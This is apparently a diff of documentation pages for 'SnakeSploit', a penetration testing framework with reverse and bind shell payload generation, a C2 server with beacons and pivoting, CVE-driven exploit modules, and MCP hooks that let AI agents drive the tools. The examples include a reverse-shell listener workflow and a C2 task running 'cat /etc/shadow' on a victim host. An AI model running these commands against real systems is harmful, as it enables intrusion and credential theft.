-        <h3>Payload Generation</h3>
-        <p>7 payload types: reverse shells (Python, Bash, Netcat, PowerShell, Perl, PHP) and bind shells. One command to generate, one click to deploy.</p>
-      </div>
-      <div class="feature-card reveal reveal-delay-1">
-        <div class="feature-icon">📡</div>
-        <h3>Port Scanner</h3>
-        <p>Fast TCP scanning with automatic service fingerprinting. Results are saved to the target database with vulnerability tracking.</p>
-      </div>
-      <div class="feature-card reveal reveal-delay-2">
-        <div class="feature-icon">🎯</div>
-        <h3>Target Management</h3>
-        <p>Persistent database tracking hosts, services, banners, and vulnerabilities. Search, filter, and export your engagement data.</p>
-      </div>
-      <div class="feature-card reveal reveal-delay-3">
-        <div class="feature-icon">🐚</div>
-        <h3>Session Handling</h3>
-        <p>Multi-session listener mode. Interactive shell access. Background session management with persistence across restarts.</p>
-      </div>
-      <div class="feature-card reveal reveal-delay-1">
-        <div class="feature-icon">🔐</div>
-        <h3>License Control</h3>
-        <p>Built-in LicenseSeat integration. Activate, revoke, and deactivate. Auto-kick on revocation within 3 minutes. Perfect for team deployments.</p>
-      </div>
-      <div class="feature-card reveal reveal-delay-2">
-        <div class="feature-icon">🖥️</div>
-        <h3>Web Dashboard</h3>
-        <p>Premium web GUI with real-time stats, target management, and live console. Connect from anywhere via GitHub Pages frontend.</p>
-      </div>
-      <div class="feature-card reveal reveal-delay-3">
-        <div class="feature-icon">🤖</div>
-        <h3>MCP Protocol</h3>
-        <p>AI agents can discover and use SnakeSploit tools via Model Context Protocol. Integrate with Claude, Cline, Cursor, and more.</p>
-        <span class="feature-tag new">New</span>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Comparison -->
-<section id="compare">
-  <div class="section-inner">
-    <div class="section-header reveal">
-      <div class="section-label">Comparison</div>
-      <h2 class="section-title">Why SnakeSploit?</h2>
-      <p class="section-sub">No other framework comes close to this level of automation and ease of use.</p>
-    </div>
-    <div class="comparison-wrap reveal">
-      <table class="comp-table">
-        <thead>
-          <tr><th>Feature</th><th>SnakeSploit</th><th>Metasploit</th><th>Custom Scripts</th></tr>
-        </thead>
-        <tbody>
-          <tr><td>Auto-updating modules from live CVEs</td><td class="comp-check">✅</td><td class="comp-cross">❌</td><td class="comp-cross">❌</td></tr>
-          <tr><td>Zero dependencies (pure Python)</td><td class="comp-check">✅</td><td class="comp-cross">❌ Requires Ruby + DB</td><td class="comp-check">✅ Varies</td></tr>
-          <tr><td>Web dashboard with live API</td><td class="comp-check">✅</td><td class="comp-cross">❌</td><td class="comp-cross">❌</td></tr>
-          <tr><td>AI agent integration (MCP)</td><td class="comp-check">✅</td><td class="comp-cross">❌</td><td class="comp-cross">❌</td></tr>
-          <tr><td>License control system</td><td class="comp-check">✅</td><td class="comp-cross">❌</td><td class="comp-cross">❌</td></tr>
-          <tr><td>GitHub Pages frontend</td><td class="comp-check">✅</td><td class="comp-cross">❌</td><td class="comp-cross">❌</td></tr>
-          <tr><td>PoC scraper (GitHub/ExploitDB)</td><td class="comp-check">✅</td><td class="comp-cross">❌</td><td class="comp-check">✅ Manual</td></tr>
-          <tr><td>Install time</td><td class="comp-check">5 seconds</td><td class="comp-cross">30+ minutes</td><td class="comp-check">Varies</td></tr>
-        </tbody>
-      </table>
-    </div>
-  </div>
-</section>
-
-<!-- Install -->
-<section id="install">
-  <div class="section-inner">
-    <div class="section-header reveal">
-      <div class="section-label">Install</div>
-      <h2 class="section-title">Get Started in Seconds</h2>
-      <p class="section-sub">No dependencies, no databases, no configuration. Just Python and a terminal.</p>
-    </div>
-    <div class="install-box reveal">
-      <div class="install-tabs">
-        <button class="install-tab active" onclick="showTab('quick')">Quick Install</button>
-        <button class="install-tab" onclick="showTab('manual')">Manual Setup</button>
-        <button class="install-tab" onclick="showTab('web')">Web Dashboard</button>
-      </div>
-      <div class="install-body">
-        <div id="tab-quick">
-          <pre><code><span class="comment"># Clone and install in 5 seconds</span>
-git clone https://github.com/HermesNA-1/SnakeSploit.git
-cd SnakeSploit
-python3 install.py
-snakesploit</code></pre>
-        </div>
-        <div id="tab-manual" style="display:none">
-          <pre><code><span class="comment"># Manual setup</span>
-git clone https://github.com/HermesNA-1/SnakeSploit.git
-cd SnakeSploit
-chmod +x snakesploit.py
-ln -s $(pwd)/snakesploit.py ~/.local/bin/snakesploit
-mkdir -p ~/.snakesploit/{cve_cache,poc_cache,loot,logs}
-snakesploit</code></pre>
-        </div>
-        <div id="tab-web" style="display:none">
-          <pre><code><span class="comment"># Start the web dashboard</span>
-pip install flask
-snakesploit --gui
-
-<span class="comment"># Open in browser: http://localhost:5000</span>
-<span class="comment"># Or use GitHub Pages: https://hermesna-1.github.io/SnakeSploit/</span></code></pre>
-        </div>
-        <button class="install-copy" onclick="copyTab()">📋 Copy</button>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Live Dashboard -->
-<section id="dashboard">
-  <div class="section-inner">
-    <div class="section-header reveal">
-      <div class="section-label">Live Demo</div>
-      <h2 class="section-title">Real-Time Dashboard</h2>
-      <p class="section-sub">Connect to your running backend and see live data from your engagement.</p>
-    </div>
-
-    <div id="connectPrompt" style="text-align:center;margin-bottom:32px" class="reveal">
-      <p style="color:var(--text2);margin-bottom:16px">Start your backend with <code style="color:var(--accent);background:var(--card);padding:2px 8px;border-radius:4px">snakesploit --gui</code> then connect</p>
-      <button class="btn btn-primary btn-lg" onclick="showConnect()">🔗 Connect to Backend</button>
-    </div>
-
-    <div class="dashboard-live" id="liveDashboard">
-      <div class="reveal">
-        <div class="live-stats" id="liveStats">
-          <div class="live-stat"><div class="num" id="dTargets">—</div><div class="lbl">Targets</div></div>
-          <div class="live-stat"><div class="num" id="dServices">—</div><div class="lbl">Services</div></div>
-          <div class="live-stat"><div class="num" id="dVulns">—</div><div class="lbl">Vulnerabilities</div></div>
-          <div class="live-stat"><div class="num" id="dModules">—</div><div class="lbl">Modules</div></div>
-          <div class="live-stat"><div class="num" id="dCves">—</div><div class="lbl">CVEs Cached</div></div>
-          <div class="live-stat"><div class="num" id="dSessions">—</div><div class="lbl">Sessions</div></div>
-        </div>
-      </div>
-      <div class="live-panel reveal">
-        <div class="live-panel-item">
-          <h4>Recent Targets</h4>
-          <div id="recentTargets" style="color:var(--text3);font-size:13px">Connect to backend to see data</div>
-        </div>
-        <div class="live-panel-item">
-          <h4>Top CVEs by Severity</h4>
-          <div id="topCves" style="color:var(--text3);font-size:13px">Connect to backend to see data</div>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- CTA -->
-<section class="cta-section">
-  <div class="reveal">
-    <h2>Ready to <span class="gradient-text">Dominate</span> Your Next Engagement?</h2>
-    <p>Join security researchers worldwide using SnakeSploit. It's free, open source, and always improving.</p>
-    <div class="hero-buttons" style="justify-content:center">
-      <a href="#install" class="btn btn-primary btn-lg">🚀 Install Now</a>
-      <a href="https://github.com/HermesNA-1/SnakeSploit" class="btn btn-lg btn-ghost" target="_blank">⭐ Star on GitHub</a>
-    </div>
-  </div>
-</section>
-
-<!-- Footer -->
-<footer>
-  <p>SnakeSploit — Open Source Penetration Testing Framework</p>
-  <p style="margin-top:4px">
-    <a href="https://github.com/HermesNA-1/SnakeSploit">GitHub</a> ·
-    <a href="https://github.com/HermesNA-1/SnakeSploit/blob/main/LICENSE">MIT License</a> ·
-    <a href="https://hermesna-1.github.io/SnakeSploit/">GitHub Pages</a>
-  </p>
-  <p style="margin-top:12px;font-size:11px;color:var(--text3)">For authorized security testing only. Unauthorized access is illegal.</p>
-</footer>
-
-<!-- Connect Modal -->
-<div class="modal-overlay" id="connectModal">
-  <div class="modal">
-    <h2>Connect to Backend</h2>
-    <p>Enter your backend URL to see live data</p>
-    <input type="text" id="backendUrl" placeholder="http://192.168.1.100:5000" value="http://localhost:5000">
-    <div class="modal-actions">
-      <button class="btn" onclick="closeConnect()">Cancel</button>
-      <button class="btn btn-primary" onclick="connectBackend()">Connect</button>
-    </div>
-    <div id="connectError" style="color:var(--accent3);font-size:13px;margin-top:8px;display:none"></div>
-  </div>
+  <div class="content" id="content"></div>
 </div>
 
-<style>
-.modal-overlay {
-  display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7);
-  backdrop-filter: blur(8px); z-index: 200; align-items: center; justify-content: center;
-}
-.modal-overlay.active { display: flex; }
-.modal {
-  background: var(--bg3); border: 1px solid var(--card-border); border-radius: var(--radius);
-  padding: 32px; max-width: 440px; width: 90%;
-}
-.modal h2 { font-size: 20px; margin-bottom: 8px; }
-.modal p { color: var(--text2); font-size: 14px; margin-bottom: 20px; }
-.modal input {
-  width: 100%; padding: 10px 14px; border-radius: 6px; border: 1px solid var(--card-border);
-  background: rgba(0,0,0,0.3); color: var(--text); font-size: 14px; outline: none;
-  margin-bottom: 16px; font-family: 'JetBrains Mono', monospace;
-}
-.modal input:focus { border-color: var(--accent); }
-.modal-actions { display: flex; gap: 8px; justify-content: flex-end; }
-</style>
-
 <script>
-// ── Scroll Reveal ──
-const observer = new IntersectionObserver((entries) => {
-  entries.forEach(entry => {
-    if (entry.isIntersecting) entry.target.classList.add('visible');
+// ── Page Content ──
+const PAGES = {
+  introduction: {
+    title: "Introduction",
+    content: `
+<p>SnakeSploit is a <strong>Python-powered penetration testing framework</strong> with auto-updating CVE/PoC modules, AI-powered scanning, payload generation, and a full C2 framework — all in one zero-dependency package.</p>
+
+<div class="callout callout-tip"><strong>⚡ Key Philosophy</strong> — Every feature is designed to work out of the box with zero configuration. No databases, no Ruby, no giant installs. Just Python and a terminal.</div>
+
+<h2>Why SnakeSploit?</h2>
+<table>
+  <tr><th>Feature</th><th>SnakeSploit</th><th>Metasploit</th><th>DIY Scripts</th></tr>
+  <tr><td>Auto-updating CVE modules</td><td>✅ Every 6h</td><td>❌ Manual updates</td><td>❌</td></tr>
+  <tr><td>Zero dependencies</td><td>✅ Pure Python</td><td>❌ Ruby + DB</td><td>✅ Varies</td></tr>
+  <tr><td>C2 Framework (Mythic + built-in)</td><td>✅</td><td>✅</td><td>❌</td></tr>
+  <tr><td>Web dashboard + GitHub Pages</td><td>✅</td><td>❌</td><td>❌</td></tr>
+  <tr><td>AI agent integration (MCP)</td><td>✅</td><td>❌</td><td>❌</td></tr>
+  <tr><td>Install time</td><td>< 5 seconds</td><td>30+ minutes</td><td>Varies</td></tr>
+</table>
+
+<h2>Architecture</h2>
+<pre><span class="comment"># SnakeSploit directory structure</span>
+SnakeSploit/
+├── <span class="var">snakesploit.py</span>      <span class="comment"># Entry point + CLI</span>
+├── <span class="var">console.py</span>          <span class="comment"># Interactive console</span>
+├── <span class="var">mcp_server.py</span>       <span class="comment"># MCP protocol server</span>
+├── <span class="var">web_gui.py</span>          <span class="comment"># Flask web dashboard</span>
+├── <span class="var">core/</span>
+│   ├── <span class="var">c2.py</span>             <span class="comment"># C2 framework (Mythic + built-in)</span>
+│   ├── <span class="var">license.py</span>        <span class="comment"># LicenseSeat integration</span>
+│   ├── <span class="var">strix.py</span>          <span class="comment"># Strix AI scanner</span>
+│   ├── <span class="var">module.py</span>         <span class="comment"># Module system</span>
+│   ├── <span class="var">target.py</span>         <span class="comment"># Target database</span>
+│   └── <span class="var">session.py</span>        <span class="comment"># Session management</span>
+├── <span class="var">updater/</span>            <span class="comment"># CVE auto-update engine</span>
+├── <span class="var">lib/</span>                <span class="comment"># Network, payloads</span>
+├── <span class="var">modules/</span>            <span class="comment"># Exploit modules</span>
+└── <span class="var">docs/</span>               <span class="comment"># GitHub Pages site</span></pre>
+
+<h2>Key Capabilities</h2>
+<div class="cmd-grid">
+  <div class="cmd-card"><div class="cmd">🎯 Interactive Console</div><div class="desc">Metasploit-like workflow: search → use → set → check → run</div></div>
+  <div class="cmd-card"><div class="cmd">🔄 CVE Auto-Update</div><div class="desc">Fetches from NVD every 6h, scrapes GitHub PoCs, generates modules</div></div>
+  <div class="cmd-card"><div class="cmd">💀 Payload Builders</div><div class="desc">7 types: Python, Bash, PowerShell, Perl, PHP, Netcat + C2 staged payloads</div></div>
+  <div class="cmd-card"><div class="cmd">📡 Port Scanner</div><div class="desc">Fast TCP with banner grabbing and service fingerprinting</div></div>
+  <div class="cmd-card"><div class="cmd">🧠 C2 Framework</div><div class="desc">Mythic API + built-in listeners, agents, tasking, pivot, staging</div></div>
+  <div class="cmd-card"><div class="cmd">🤖 MCP Integration</div><div class="desc">AI agents discover and use tools via Model Context Protocol</div></div>
+  <div class="cmd-card"><div class="cmd">🖥️ Web Dashboard</div><div class="desc">Real-time stats, target management, live console, engagement reports</div></div>
+  <div class="cmd-card"><div class="cmd">🔐 License Control</div><div class="desc">LicenseSeat: activate, revoke, deactivate, auto-kick on revocation</div></div>
+</div>
+    `
+  },
+
+  installation: {
+    title: "Installation",
+    content: `
+<h2>Quick Install</h2>
+<div class="steps">
+  <div class="step"><h3>Clone the repository</h3><pre>git clone https://github.com/HermesNA-1/SnakeSploit.git<br>cd SnakeSploit</pre></div>
+  <div class="step"><h3>Run the installer</h3><pre>python3 install.py</pre><p>This creates the symlink, sets up cron for auto-updates, and fetches the initial CVE cache.</p></div>
+  <div class="step"><h3>Launch SnakeSploit</h3><pre>snakesploit</pre></div>
+</div>
+
+<h2>Manual Install</h2>
+<pre>chmod +x snakesploit.py
+ln -s $(pwd)/snakesploit.py ~/.local/bin/snakesploit
+mkdir -p ~/.snakesploit/{cve_cache,poc_cache,loot,logs}</pre>
+
+<h2>Web Dashboard</h2>
+<p>The web GUI requires Flask:</p>
+<pre>pip install flask
+snakesploit --gui
+<span class="comment"># Open: http://localhost:5000</span>
+<span class="comment"># Or GitHub Pages: https://hermesna-1.github.io/SnakeSploit/</span></pre>
+
+<h2>Dependencies</h2>
+<p>SnakeSploit core uses <strong>only Python standard library</strong>. Optional:</p>
+<ul>
+  <li><strong>Flask</strong> — Web GUI dashboard</li>
+  <li><strong>nmap</strong> — Advanced port scanning</li>
+  <li><strong>git</strong> — Self-update feature</li>
+</ul>
+
+<h2>Updating</h2>
+<pre>snakesploit --update-self    <span class="comment"># Pull latest code from GitHub</span>
+snakesploit --update         <span class="comment"># Pull code + fetch CVEs</span></pre>
+<p>Or from the console: <code>update</code> does both in one command.</p>
+    `
+  },
+
+  quickstart: {
+    title: "Quick Start",
+    content: `
+<h2>Your First Engagement</h2>
+
+<div class="steps">
+  <div class="step"><h3>Pull the latest CVEs</h3><pre>snakesploit > update 7</pre><p>Fetches the last 7 days of vulnerabilities from NVD and generates modules.</p></div>
+
+  <div class="step"><h3>Scan a target</h3><pre>snakesploit > scan 192.168.1.100</pre><p>Discovers open ports and adds the target to your database automatically.</p></div>
+
+  <div class="step"><h3>Search for relevant modules</h3><pre>snakesploit > search smb
+snakesploit > search eternalblue
+snakesploit > search apache</pre></div>
+
+  <div class="step"><h3>Use a module</h3><pre>snakesploit > use smb_version_scanner
+snakesploit (smb_version_scanner) > set RHOSTS 192.168.1.100
+snakesploit (smb_version_scanner) > set RPORT 445
+snakesploit (smb_version_scanner) > check
+snakesploit (smb_version_scanner) > run</pre></div>
+
+  <div class="step"><h3>Generate a payload</h3><pre>snakesploit > payloads python_reverse LHOST=10.0.0.5 LPORT=4444</pre></div>
+
+  <div class="step"><h3>Start a listener and catch the shell</h3><pre>snakesploit > listener 4444
+[+] Connection from 192.168.1.100:54321
+[+] Session rev_1 created
+snakesploit > sessions -i rev_1</pre></div>
+</div>
+
+<h2>CLI Quick Reference</h2>
+<pre>snakesploit                    <span class="comment"># Start interactive console</span>
+snakesploit --update           <span class="comment"># Pull code + fetch CVEs</span>
+snakesploit --update-self      <span class="comment"># Just pull latest code</span>
+snakesploit --full             <span class="comment"># Full pipeline: CVEs → PoCs → modules</span>
+snakesploit --gui              <span class="comment"># Start web dashboard</span>
+snakesploit --mcp              <span class="comment"># Start MCP server for AI agents</span>
+snakesploit --cve stats        <span class="comment"># Show CVE cache statistics</span>
+snakesploit --activate KEY     <span class="comment"># Activate license</span>
+snakesploit --deactivate       <span class="comment"># Deactivate device</span></pre>
+    `
+  },
+
+  console: {
+    title: "Console Reference",
+    content: `
+<h2>Interactive Console</h2>
+<p>SnakeSploit's console is a full-featured interactive shell with tab completion and a Metasploit-like workflow.</p>
+
+<h3>Core Commands</h3>
+<div class="cmd-grid">
+  <div class="cmd-card"><div class="cmd">help</div><div class="desc">Show full command reference</div></div>
+  <div class="cmd-card"><div class="cmd">exit / quit</div><div class="desc">Exit SnakeSploit</div></div>
+  <div class="cmd-card"><div class="cmd">clear</div><div class="desc">Clear the screen</div></div>
+  <div class="cmd-card"><div class="cmd">shell &lt;cmd&gt;</div><div class="desc">Run a system command</div></div>
+  <div class="cmd-card"><div class="cmd">banner</div><div class="desc">Show the SnakeSploit banner</div></div>
+</div>
+
+<h3>Module Commands</h3>
+<div class="cmd-grid">
+  <div class="cmd-card"><div class="cmd">search &lt;q&gt;</div><div class="desc">Search modules by name/CVE</div></div>
+  <div class="cmd-card"><div class="cmd">use &lt;name&gt;</div><div class="desc">Load a module</div></div>
+  <div class="cmd-card"><div class="cmd">set &lt;opt&gt; &lt;val&gt;</div><div class="desc">Set a module option</div></div>
+  <div class="cmd-card"><div class="cmd">show options</div><div class="desc">Show module settings</div></div>
+  <div class="cmd-card"><div class="cmd">show info</div><div class="desc">Show module metadata</div></div>
+  <div class="cmd-card"><div class="cmd">check</div><div class="desc">Vulnerability probe</div></div>
+  <div class="cmd-card"><div class="cmd">run / exploit</div><div class="desc">Execute the module</div></div>
+  <div class="cmd-card"><div class="cmd">back</div><div class="desc">Unload current module</div></div>
+  <div class="cmd-card"><div class="cmd">list [cat]</div><div class="desc">List modules by category</div></div>
+  <div class="cmd-card"><div class="cmd">reload modules</div><div class="desc">Reload from disk</div></div>
+</div>
+
+<h3>Update Commands</h3>
+<div class="cmd-grid">
+  <div class="cmd-card"><div class="cmd">update [days]</div><div class="desc">Pull code + fetch CVEs</div></div>
+  <div class="cmd-card"><div class="cmd">update full</div><div class="desc">Full pipeline: CVEs → PoCs → modules</div></div>
+  <div class="cmd-card"><div class="cmd">update-self</div><div class="desc">Just pull latest code</div></div>
+  <div class="cmd-card"><div class="cmd">cve stats</div><div class="desc">Show CVE cache statistics</div></div>
+  <div class="cmd-card"><div class="cmd">pocs &lt;CVE&gt;</div><div class="desc">Search PoCs for a CVE</div></div>
+</div>
+
+<h3>Payload Commands</h3>
+<div class="cmd-grid">
+  <div class="cmd-card"><div class="cmd">payloads</div><div class="desc">List all payload types</div></div>
+  <div class="cmd-card"><div class="cmd">payloads &lt;type&gt; ...</div><div class="desc">Generate a payload</div></div>
+  <div class="cmd-card"><div class="cmd">listener &lt;port&gt;</div><div class="desc">Start a listener</div></div>
+  <div class="cmd-card"><div class="cmd">sessions [-i id]</div><div class="desc">List/interact sessions</div></div>
+</div>
+
+<h3>Target Commands</h3>
+<div class="cmd-grid">
+  <div class="cmd-card"><div class="cmd">targets</div><div class="desc">List all targets</div></div>
+  <div class="cmd-card"><div class="cmd">targets add &lt;h&gt;</div><div class="desc">Add a target</div></div>
+  <div class="cmd-card"><div class="cmd">targets show &lt;h&gt;</div><div class="desc">View target details</div></div>
+  <div class="cmd-card"><div class="cmd">scan &lt;h&gt; [p]</div><div class="desc">TCP port scan</div></div>
+  <div class="cmd-card"><div class="cmd">http &lt;url&gt;</div><div class="desc">HTTP GET request</div></div>
+</div>
+
+<h3>Advanced Commands</h3>
+<div class="cmd-grid">
+  <div class="cmd-card"><div class="cmd">strix &lt;target&gt;</div><div class="desc">Strix AI scan</div></div>
+  <div class="cmd-card"><div class="cmd">mcp [http]</div><div class="desc">Start MCP server</div></div>
+  <div class="cmd-card"><div class="cmd">gui [port]</div><div class="desc">Start web dashboard</div></div>
+  <div class="cmd-card"><div class="cmd">deactivate</div><div class="desc">Free license seat</div></div>
+  <div class="cmd-card"><div class="cmd">logout</div><div class="desc">Alias for deactivate</div></div>
+</div>
+    `
+  },
+
+  modules: {
+    title: "Module System",
+    content: `
+<h2>Module System</h2>
+<p>SnakeSploit uses a <strong>modular framework</strong> where each exploit, scanner, or auxiliary tool is a self-contained Python module.</p>
+
+<h3>Module Types</h3>
+<table>
+  <tr><th>Type</th><th>Description</th><th>Example</th></tr>
+  <tr><td><code>auxiliary</code></td><td>Scanners, fingerprinters, recon tools</td><td>smb_version_scanner, http_banner_grabber</td></tr>
+  <tr><td><code>exploit</code></td><td>Vulnerability exploitation modules</td><td>Auto-generated from CVEs</td></tr>
+  <tr><td><code>payload</code></td><td>Payload generation</td><td>Reverse shells, bind shells</td></tr>
+</table>
+
+<h3>Auto-Generated Modules</h3>
+<p>The CVE auto-update engine generates modules from live vulnerabilities:</p>
+<pre><span class="comment"># Example auto-generated module structure</span>
+modules/<span class="var">cve-2026-44040_ultravnc_through_1822.py</span>
+├── metadata: CVE ID, description, references
+├── options: RHOSTS, RPORT
+├── check()  <span class="comment"># Probe target for vulnerability</span>
+└── run()    <span class="comment"># Execute the PoC</span></pre>
+
+<h3>Writing Custom Modules</h3>
+<p>Modules inherit from <code>NovaModule</code>:</p>
+<pre><span class="keyword">from</span> core.module <span class="keyword">import</span> NovaModule, ModuleMetadata
+
+<span class="keyword">class</span> <span class="func">Module</span>(NovaModule):
+    metadata = ModuleMetadata(
+        name=<span class="string">"my_custom_scanner"</span>,
+        description=<span class="string">"Scans for custom service"</span>,
+        rank=<span class="string">"good"</span>,
+    )
+    required_options = [<span class="string">"RHOSTS"</span>, <span class="string">"RPORT"</span>]
+
+    <span class="keyword">def</span> <span class="func">run</span>(self) -> dict:
+        host = self.options[<span class="string">"RHOSTS"</span>]
+        port = <span class="func">int</span>(self.options[<span class="string">"RPORT"</span>])
+        <span class="comment"># Your scanner code here</span>
+        <span class="keyword">return</span> {<span class="string">"result"</span>: <span class="string">"ok"</span>}</pre>
+
+<h3>Module Lifecycle</h3>
+<div class="steps">
+  <div class="step"><strong>Discover</strong> — ModuleManager scans module directories</div>
+  <div class="step"><strong>Load</strong> — Module file is imported and instantiated</div>
+  <div class="step"><strong>Configure</strong> — User sets RHOSTS, RPORT, etc.</div>
+  <div class="step"><strong>Check</strong> — Non-destructive vulnerability probe</div>
+  <div class="step"><strong>Run</strong> — Module executes against the target</div>
+  <div class="step"><strong>Report</strong> — Results stored in target database</div>
+</div>
+    `
+  },
+
+  payloads: {
+    title: "Payload Builders",
+    content: `
+<h2>Payload Generator</h2>
+<p>SnakeSploit includes a built-in payload generator with <strong>7 types</strong> plus <strong>C2 staged payloads</strong> for advanced deployment.</p>
+
+<h3>Built-in Payloads</h3>
+<table>
+  <tr><th>Type</th><th>Platform</th><th>Use Case</th></tr>
+  <tr><td><code>linux_reverse</code></td><td>Linux</td><td>Bash /dev/tcp reverse shell</td></tr>
+  <tr><td><code>python_reverse</code></td><td>Multi</td><td>Python reverse shell (most versatile)</td></tr>
+  <tr><td><code>nc_reverse</code></td><td>Linux</td><td>Netcat reverse shell</td></tr>
+  <tr><td><code>powershell_reverse</code></td><td>Windows</td><td>PowerShell TCP reverse shell</td></tr>
+  <tr><td><code>perl_reverse</code></td><td>Multi</td><td>Perl reverse shell</td></tr>
+  <tr><td><code>python_bind</code></td><td>Multi</td><td>Python bind shell (listens on target)</td></tr>
+  <tr><td><code>php_reverse</code></td><td>Web</td><td>PHP reverse shell for web apps</td></tr>
+</table>
+
+<h3>Usage</h3>
+<pre><span class="comment"># Generate a Python reverse shell</span>
+snakesploit > payloads python_reverse LHOST=10.0.0.5 LPORT=4444
+
+<span class="comment"># Generate with base64 encoding</span>
+snakesploit > payloads nc_reverse LHOST=10.0.0.5 LPORT=4444 encode=true
+
+<span class="comment"># Generate a bind shell</span>
+snakesploit > payloads python_bind LPORT=5555</pre>
+
+<h3>C2 Staged Payloads</h3>
+<p>For C2 operations, use the built-in staging system which generates beacons that check in to your listener:</p>
+
+<pre><span class="comment"># Stage a Python C2 beacon</span>
+snakesploit > c2 payload python LHOST=10.0.0.5 LPORT=4444 name=beacon1
+
+<span class="comment"># Stage a PowerShell beacon (Windows targets)</span>
+snakesploit > c2 payload powershell LHOST=10.0.0.5 LPORT=4444 name=beacon_win
+
+<span class="comment"># Stage a Bash beacon (Linux targets)</span>
+snakesploit > c2 payload bash LHOST=10.0.0.5 LPORT=4444 name=beacon_linux</pre>
+
+<h3>Payload Types Detail</h3>
+<p><strong>Python beacon</strong> — Most versatile, runs on any system with Python. Supports tasking, command execution, and output return.</p>
+<p><strong>PowerShell beacon</strong> — Targets Windows environments. Uses native PowerShell TCP sockets.</p>
+<p><strong>Bash beacon</strong> — Lightweight Linux/Unix beacon. Uses /dev/tcp for communication.</p>
+    `
+  },
+
+  scanning: {
+    title: "Port Scanning",
+    content: `
+<h2>Port Scanner</h2>
+<p>SnakeSploit includes a fast TCP port scanner with automatic target database integration.</p>
+
+<h3>Basic Scan</h3>
+<pre>snakesploit > scan 192.168.1.100
+[*] Scanning 192.168.1.100...
+[+] Found 3 open ports:
+  Port     State
+  22       open
+  139      open
+  445      open</pre>
+
+<h3>Custom Ports</h3>
+<pre>snakesploit > scan 192.168.1.100 22,80,443,3306,8080</pre>
+
+<h3>Deep Scan with Banner Grabbing</h3>
+<p>The <code>/api/scan/deep</code> endpoint scans 32 common ports and grabs banners from each:</p>
+<pre><span class="comment"># From the web dashboard API:</span>
+POST /api/scan/deep
+{ "host": "192.168.1.100" }
+
+<span class="comment"># Returns enriched results with banners:</span>
+{
+  "target": "192.168.1.100",
+  "results": [
+    {"port": 22, "state": "open", "banner": "SSH-2.0-OpenSSH_8.9p1"},
+    {"port": 80, "state": "open", "banner": "HTTP/1.1 200 OK..."}
+  ]
+}</pre>
+
+<h3>Target Database Integration</h3>
+<p>All scan results are automatically saved to the target database with service information and banner data. Targets persist across sessions.</p>
+<pre>snakesploit > targets
+  Host              OS    Services  Vulns
+  192.168.1.100   unknown  3        0
+
+snakesploit > targets show 192.168.1.100
+  OS: unknown
+  Services:
+    22/tcp   open   SSH-2.0-OpenSSH_8.9p1
+    139/tcp  open   NetBIOS
+    445/tcp  open   SMB</pre>
+    `
+  },
+
+  targets: {
+    title: "Target Management",
+    content: `
+<h2>Target Management</h2>
+<p>SnakeSploit maintains a persistent target database at <code>~/.snakesploit/targets.json</code>.</p>
+
+<h3>Commands</h3>
+<pre>snakesploit > targets                       <span class="comment"># List all targets</span>
+snakesploit > targets add 192.168.1.100    <span class="comment"># Add a target</span>
+snakesploit > targets show 192.168.1.100   <span class="comment"># Show target details</span>
+snakesploit > targets rm 192.168.1.100     <span class="comment"># Remove a target</span></pre>
+
+<h3>Target Data Model</h3>
+<p>Each target stores:</p>
+<ul>
+  <li>Hostname and IP address</li>
+  <li>Operating system (detected or manual)</li>
+  <li>Open services with port, protocol, banner</li>
+  <li>Discovered vulnerabilities with CVE IDs</li>
+  <li>Scan history and notes</li>
+</ul>
+
+<h3>Automatic Tracking</h3>
+<p>Targets are added automatically when you:</p>
+<ul>
+  <li>Run a <code>scan</code> command</li>
+  <li>Execute a module (the RHOSTS target is saved)</li>
+  <li>Run a Strix scan</li>
+  <li>Use <code>targets add</code></li>
+</ul>
+
+<h3>Vulnerability Tracking</h3>
+<p>When a module finds a vulnerability, it's recorded:</p>
+<pre>snakesploit > targets show 192.168.1.100
+  Vulnerabilities:
+    [CVE-2017-0143] SMB Remote Code Execution (EternalBlue)
+    [CVE-2020-0796] SMBv3 Compression RCE</pre>
+    `
+  },
+
+  sessions: {
+    title: "Session Handling",
+    content: `
+<h2>Session Handling</h2>
+<p>SnakeSploit manages interactive sessions from reverse shells, bind shells, and C2 agents.</p>
+
+<h3>Starting a Listener</h3>
+<pre>snakesploit > listener 4444
+[+] Listener started on port 4444
+    Waiting for incoming connections...</pre>
+
+<h3>Managing Sessions</h3>
+<pre>snakesploit > sessions
+  ID           Type         Target           State
+  rev_1        reverse      10.0.0.1:4444   active
+  bin_2        bind         10.0.0.2:5555   active
+
+snakesploit > sessions -i rev_1    <span class="comment"># Interact with session</span>
+[rev_1] > whoami
+root
+[rev_1] > exit
+
+snakesploit > sessions -k rev_1    <span class="comment"># Kill session</span></pre>
+
+<h3>C2 Agents</h3>
+<p>SnakeSploit's built-in C2 server also provides advanced session management with automatic check-in:</p>
+<pre>snakesploit > c2 listener create beacon 0.0.0.0 5555
+snakesploit > c2 listener start beacon
+snakesploit > c2 list
+  agent_1  192.168.1.100  user@victim-pc  windows  active
+  agent_2  10.0.0.50     root@server    linux    active
+
+snakesploit > c2 task agent_1 "whoami"
+snakesploit > c2 task agent_2 "cat /etc/shadow"</pre>
+    `
+  },
+
+  "c2-overview": {
+    title: "C2 Framework Overview",
+    content: `
+<h2>C2 Framework <span class="tag tag-new">New</span></h2>
+<p>SnakeSploit includes a full Command & Control framework inspired by <strong>Mythic C2</strong> and <strong>Adaptix</strong> — with listener management, agent tasking, payload staging, and Mythic API integration.</p>
+
+<div class="callout callout-tip"><strong>Two modes:</strong> Use the built-in C2 server for lightweight ops, or connect to a Mythic server for full-scale campaigns.</div>
+
+<h2>Built-in C2 Server</h2>
+<table>
+  <tr><th>Feature</th><th>Description</th></tr>
+  <tr><td>TCP Listeners</td><td>Bind to any port, accept agent connections</td></tr>
+  <tr><td>Agent Check-in</td><td>Agents automatically register with system info</td></tr>
+  <tr><td>Task Queue</td><td>Send commands to agents, retrieve output</td></tr>
+  <tr><td>Payload Staging</td><td>Generate Python, PowerShell, Bash beacons</td></tr>
+  <tr><td>Pivot Listeners</td><td>Route traffic through compromised agents</td></tr>
+  <tr><td>Persistence</td><td>State saved to disk, survives restart</td></tr>
+</table>
+
+<h2>Mythic Integration</h2>
+<table>
+  <tr><th>Feature</th><th>Description</th></tr>
+  <tr><td>REST API Client</td><td>Full Mythic server control via API</td></tr>
+  <tr><td>Callback Management</td><td>List, task, monitor agents</td></tr>
